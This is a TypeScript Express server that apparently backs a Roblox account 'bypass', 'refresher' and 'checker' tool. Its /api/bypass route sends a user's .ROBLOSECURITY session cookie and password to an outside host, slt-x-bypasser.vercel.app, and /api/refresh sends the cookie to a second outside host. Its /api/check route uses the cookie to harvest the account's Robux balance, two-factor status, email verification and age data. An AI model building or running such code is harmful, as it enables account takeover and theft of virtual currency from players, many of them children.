import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API routes
  app.post("/api/bypass", async (req, res) => {
    const { cookie, password } = req.body;
    
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    
    const isValidCookie = (c: string) => {
      return c && c.startsWith(ROBLOX_WARNING) && c.length > 150;
    };
    
    if (!isValidCookie(cookie)) {
      return res.status(400).json({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
    }
    
    const url = "https://slt-x-bypasser.vercel.app/api/bypass";
    const payload = {
      cook: cookie || "not_provided",
      password: password || "not_provided",
    };

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const data = await response.json();
      res.json({ result: data });
    } catch (error) {
      console.error("Bypass error:", error);
      res.status(500).json({ error: "Failed to execute bypass" });
    }
  });

  app.post("/api/refresh", async (req, res) => {
    const { cookie } = req.body;
    
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    
    const isValidCookie = (c: string) => {
      return c && c.startsWith(ROBLOX_WARNING) && c.length > 150;
    };
    
    if (!isValidCookie(cookie)) {
      return res.status(400).json({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
    }
    
    const url = "https://slt-x-refresher.vercel.app/api/refresh";

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: JSON.stringify({
          cookie: cookie
        }) 
      });

      const text = await response.text();
      
      if (response.ok) {
        res.json({ 
          result: {
            success: true,
            message: "Success! The request went through.",
            content: text
          }
        });
      } else {
        res.status(response.status).json({ 
          result: {
            success: false,
            message: `Failed with status code: ${response.status}`,
            content: text
          }
        });
      }
    } catch (error) {
      console.error("Refresh error:", error);
      res.status(500).json({ error: "An error occurred during the refresh process" });
    }
  });

  app.post(["/api/check", "/api/scrape"], async (req, res) => {
    const { cookie } = req.body;
    
    const ROBLOX_WARNING = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    
    if (!cookie || !cookie.startsWith(ROBLOX_WARNING) || cookie.length <= 150) {
      return res.status(400).json({ 
        error: "Invalid Cookie", 
        message: "The cookie must start with the standard Roblox warning message and be of a valid length to be valid." 
      });
    }

    const headers: Record<string, string> = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
      "Accept": "application/json",
      "Referer": "https://www.roblox.com/",
      "Origin": "https://www.roblox.com",
      "Cookie": `.ROBLOSECURITY=${cookie}`
    };

    try {
      console.log("Starting account check for cookie starting with:", cookie.substring(0, 50));
      
      // 1. Get CSRF Token (Forces a refresh)
      // We also capture any additional cookies Roblox might set
      const authRes = await fetch("https://auth.roblox.com/v2/login", {
        method: "POST",
        headers
      });
      
      const csrfToken = authRes.headers.get("x-csrf-token");
      if (csrfToken) {
        headers["X-CSRF-TOKEN"] = csrfToken;
        console.log("CSRF Token obtained:", csrfToken.substring(0, 10) + "...");
      }

      // Capture set-cookie headers to maintain session state if needed
      // @ts-ignore - getSetCookie is available in Node 18+
      const setCookies = typeof authRes.headers.getSetCookie === 'function' ? authRes.headers.getSetCookie() : [];
      if (setCookies && setCookies.length > 0) {
        const newCookies = setCookies.map(c => c.split(';')[0]).join('; ');
        headers["Cookie"] = `.ROBLOSECURITY=${cookie}; ${newCookies}`;
        console.log("Additional cookies captured:", setCookies.length);
      }

      // 2. Get Authenticated User (Verify cookie validity)
      const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
      if (!userRes.ok) {
        const errorText = await userRes.text();
        console.error("Auth verify failed:", userRes.status, errorText);
        return res.json({
          status: "error",
          message: `Roblox API returned ${userRes.status}. This usually means the cookie is invalid or Roblox is blocking the server's IP.`,
          debug: { status: userRes.status, text: errorText.substring(0, 100) }
        });
      }
      const userData = await userRes.json();
      const userId = userData.id;
      const username = userData.name;
      const displayName = userData.displayName;

      // 3. Get Settings Raw
      const settingsRes = await fetch("https://www.roblox.com/my/settings/json", { headers });
      const settingsText = settingsRes.ok ? await settingsRes.text() : "{}";

      // 4. Get Account Details
      const userDetailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers });
      const userDetails = userDetailsRes.ok ? await userDetailsRes.json() : {};
      
      let daysOld = 0;
      if (userDetails.created) {
        const createdDate = new Date(userDetails.created);
        const now = new Date();
        daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
      }

      // Avatar
      let avatarUrl = "";
      const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { headers });
      if (avatarRes.ok) {
        const avatarData = await avatarRes.json();
        if (avatarData.data && avatarData.data.length > 0) {
          avatarUrl = avatarData.data[0].imageUrl || "";
        }
      }

      // 5. Get Presence
      let presence = {};
      try {
        const presenceRes = await fetch("https://presence.roblox.com/v1/presence/users", {
          method: "POST",
          headers: { ...headers, "Content-Type": "application/json" },
          body: JSON.stringify({ userIds: [userId] })
        });
        if (presenceRes.ok) {
          const presenceData = await presenceRes.json();
          if (presenceData.userPresences && presenceData.userPresences.length > 0) {
            const p = presenceData.userPresences[0];
            const statusMap: Record<number, string> = { 0: "Offline", 1: "Online", 2: "InGame", 3: "InStudio" };
            const label = statusMap[p.userPresenceType] || "Offline";
            const isOnline = p.userPresenceType > 0;
            presence = {
              code: p.userPresenceType,
              status: label.toLowerCase(),
              label: label,
              circle: isOnline ? "green" : "gray",
              hex: isOnline ? "#00B06F" : "#9CA3AF"
            };
          }
        }
      } catch (e) {}

      // 6. Get Economy and Status
      let robux = 0;
      const currRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
      if (currRes.ok) {
        const currData = await currRes.json();
        robux = currData.robux || 0;
      }

      let isPremium = "False";
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers });
      if (premRes.ok) {
        const premData = await premRes.json();
        isPremium = premData ? "True" : "False";
      }

      const result = {
        status: "success",
        user_info: {
          username: username,
          display_name: displayName,
          user_id: userId,
          age_status: settingsText.includes('"UserAbove13":false') ? "<13" : "13+",
          account_age_days: daysOld,
          avatar_url: avatarUrl
        },
        presence: presence,
        account_status: {
          robux_balance: robux,
          pending_robux: 0,
          premium: isPremium,
          email_verified: settingsText.includes('"IsEmailVerified":true') ? "Verified" : "Unverified",
          two_factor_auth: settingsText.includes('"IsTwoStepToggleEnabled":true') ? "True" : "False",
          voice_chat: settingsText.includes('"IsVoiceEnabled":true') ? "True" : "Unknown",
          age_verified: settingsText.includes('"IsAgeVerified":true') ? "True" : "False"
        },
        inventory: {
          note: "Inventory scanning requires iterating pages of assets and is slow."
        },
        games: {
          per_game: {} as Record<string, any>
        }
      };

      // 7. Get Game Data
      const gamesMap = {
        "blox_fruits": 1305885091,
        "adopt_me": 920587237,
        "murder_mystery_2": 66654135
      };
      
      for (const [name, universeId] of Object.entries(gamesMap)) {
        let voteData: any = { userVote: null };
        try {
          const voteRes = await fetch(`https://games.roblox.com/v1/games/${universeId}/votes/user`, { headers });
          if (voteRes.ok) {
            voteData = await voteRes.json();
          }
        } catch (e) {}
        
        result.games.per_game[name] = {
          played_proxy: voteData.userVote !== null,
          votes_raw: voteData
        };
      }

      res.json({ result });
    } catch (error) {
      console.error("Checker error:", error);
      res.status(500).json({ error: "An error occurred during the checker process" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
